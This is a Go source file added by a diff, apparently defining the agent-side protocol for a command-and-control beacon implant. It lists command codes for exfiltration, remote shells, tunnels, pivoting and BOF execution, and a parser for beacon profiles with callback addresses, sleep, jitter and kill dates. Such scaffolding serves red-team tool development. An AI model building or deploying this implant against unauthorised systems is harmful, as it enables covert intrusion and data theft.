@@ -1,0 +1,271 @@
+package protocol
+
+import "errors"
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Agent-side types for the adaptix_default binary protocol.
+//
+// These types are used by impl/ interfaces and the task dispatcher.
+// No struct tags — serialization is manual via WriterBE / ReaderLE.
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// ─── Command codes (beacon wire-compatible) ────────────────────────────────────
+// Must match the server's constants.go.tmpl values exactly.
+
+const (
+	COMMAND_CAT          = 24
+	COMMAND_COPY         = 12
+	COMMAND_CD           = 8
+	COMMAND_DISKS        = 15
+	COMMAND_DOWNLOAD     = 32
+	COMMAND_EXEC_BOF     = 50
+	COMMAND_EXEC_BOF_OUT = 51
+	COMMAND_EXFIL        = 35
+	COMMAND_GETUID       = 22
+	COMMAND_JOBS_KILL    = 47
+	COMMAND_JOB_LIST     = 46
+	COMMAND_LINK         = 38
+	COMMAND_LS           = 14
+	COMMAND_MV           = 18
+	COMMAND_MKDIR        = 27
+	COMMAND_PIVOT_EXEC   = 37
+	COMMAND_PS_LIST      = 41
+	COMMAND_PS_KILL      = 42
+	COMMAND_PS_RUN       = 43
+	COMMAND_PROFILE      = 21
+	COMMAND_PWD          = 4
+	COMMAND_REV2SELF     = 23
+	COMMAND_RM           = 17
+	COMMAND_TERMINATE    = 10
+	COMMAND_UNLINK       = 39
+	COMMAND_UPLOAD       = 33
+
+	COMMAND_TUNNEL_START_TCP = 62
+	COMMAND_TUNNEL_START_UDP = 63
+	COMMAND_TUNNEL_WRITE_TCP = 64
+	COMMAND_TUNNEL_WRITE_UDP = 65
+	COMMAND_TUNNEL_CLOSE     = 66
+	COMMAND_TUNNEL_REVERSE   = 67
+	COMMAND_TUNNEL_ACCEPT    = 68
+	COMMAND_TUNNEL_PAUSE     = 69
+	COMMAND_TUNNEL_RESUME    = 70
+
+	COMMAND_SHELL_START  = 71
+	COMMAND_SHELL_WRITE  = 72
+	COMMAND_SHELL_CLOSE  = 73
+	COMMAND_SHELL_ACCEPT = 74
+
+	COMMAND_JOB        = 0x8437
+	COMMAND_SAVEMEMORY  = 0x2321
+	COMMAND_ERROR      = 0x1111ffff
+)
+
+// ─── Download states ───────────────────────────────────────────────────────────
+
+const (
+	DOWNLOAD_START    = 0x1
+	DOWNLOAD_CONTINUE = 0x2
+	DOWNLOAD_FINISH   = 0x3
+)
+
+// ─── Job types & states ────────────────────────────────────────────────────────
+
+const (
+	JOB_TYPE_LOCAL   = 0x1
+	JOB_TYPE_REMOTE  = 0x2
+	JOB_TYPE_PROCESS = 0x3
+	JOB_TYPE_SHELL   = 0x4
+)
+
+const (
+	JOB_STATE_STARTING = 0x0
+	JOB_STATE_RUNNING  = 0x1
+	JOB_STATE_FINISHED = 0x2
+	JOB_STATE_KILLED   = 0x3
+)
+
+// ─── BOF callback & error codes ────────────────────────────────────────────────
+
+const (
+	CALLBACK_OUTPUT      = 0x0
+	CALLBACK_OUTPUT_OEM  = 0x1e
+	CALLBACK_OUTPUT_UTF8 = 0x20
+	CALLBACK_ERROR       = 0x0d
+	CALLBACK_CUSTOM      = 0x1000
+	CALLBACK_CUSTOM_LAST = 0x13ff
+
+	CALLBACK_AX_SCREENSHOT   = 0x81
+	CALLBACK_AX_DOWNLOAD_MEM = 0x82
+
+	BOF_ERROR_PARSE     = 0x101
+	BOF_ERROR_SYMBOL    = 0x102
+	BOF_ERROR_MAX_FUNCS = 0x103
+	BOF_ERROR_ENTRY     = 0x104
+	BOF_ERROR_ALLOC     = 0x105
+)
+
+// ─── Agent-side types ──────────────────────────────────────────────────────────
+
+// DirEntry is used by impl/interfaces.go FileSystem.GetListing.
+// Fields match the server's ProcessData parser for COMMAND_LS responses.
+type DirEntry struct {
+	Name  string
+	IsDir bool
+	Size  int64
+	Date  int64 // Unix timestamp
+}
+
+// ProcessEntry is used by impl/interfaces.go Execution.ListProcesses.
+// Fields match the server's ProcessData parser for COMMAND_PS_LIST responses.
+type ProcessEntry struct {
+	Pid       uint16
+	PPid      uint16
+	SessionId uint16
+	IsArch64  bool
+	Elevated  bool
+	Domain    string
+	Username  string
+	Name      string
+}
+
+// ─── Connection profile ────────────────────────────────────────────────────────
+// Profile carries the embedded connection configuration.
+// The server encodes this in GenerateProfiles / BuildPayload.
+// TODO: Implement ParseProfile to match your server's encoding.
+
+type Profile struct {
+	Type        uint32
+	Addresses   []string
+	BannerSize  int
+	ConnTimeout int
+	ConnCount   int
+	UseSSL      bool
+	SslCert     []byte
+	SslKey      []byte
+	CaCert      []byte
+	Sleep       int
+	Jitter      int
+	KillDate    int64
+	WorkStart   int
+	WorkEnd     int
+}
+
+// ParseProfile parses a decrypted profile blob into a Profile struct.
+// The server encodes the profile using PackArray (LE) in GenerateProfiles.
+// Field order must match exactly:
+//   Type(u32) AddrCount(u32) Addr...(string) BannerSize(u32) ConnTimeout(u32)
+//   ConnCount(u32) UseSSL(u8) SslCert(len+bytes) SslKey(len+bytes)
+//   CaCert(len+bytes) Sleep(u32) Jitter(u32) KillDate(u32) WorkStart(u32) WorkEnd(u32)
+func ParseProfile(data []byte) (*Profile, error) {
+	if len(data) < 8 {
+		return nil, errors.New("profile data too short")
+	}
+
+	r := NewReaderLE(data)
+	p := &Profile{}
+
+	t, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.Type = t
+
+	addrCount, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	for i := 0; i < int(addrCount); i++ {
+		addr, err := r.ReadString()
+		if err != nil {
+			return nil, err
+		}
+		p.Addresses = append(p.Addresses, addr)
+	}
+
+	bs, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.BannerSize = int(bs)
+
+	ct, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.ConnTimeout = int(ct)
+
+	cc, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.ConnCount = int(cc)
+
+	ssl, err := r.ReadBool()
+	if err != nil {
+		return nil, err
+	}
+	p.UseSSL = ssl
+
+	p.SslCert, err = readLenPrefixedBytes(r)
+	if err != nil {
+		return nil, err
+	}
+	p.SslKey, err = readLenPrefixedBytes(r)
+	if err != nil {
+		return nil, err
+	}
+	p.CaCert, err = readLenPrefixedBytes(r)
+	if err != nil {
+		return nil, err
+	}
+
+	sl, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.Sleep = int(sl)
+
+	ji, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.Jitter = int(ji)
+
+	kd, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.KillDate = int64(kd)
+
+	ws, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.WorkStart = int(ws)
+
+	we, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	p.WorkEnd = int(we)
+
+	return p, nil
+}
+
+// readLenPrefixedBytes reads [LE uint32 len][raw bytes] from the reader.
+func readLenPrefixedBytes(r *ReaderLE) ([]byte, error) {
+	sz, err := r.ReadUint32()
+	if err != nil {
+		return nil, err
+	}
+	if sz == 0 {
+		return nil, nil
+	}
+	return r.ReadRawBytes(int(sz))
+}
+
+// ─── AnsError ──────────────────────────────────────────────────────────────────
+
+type AnsError struct {
+	Error string
+}
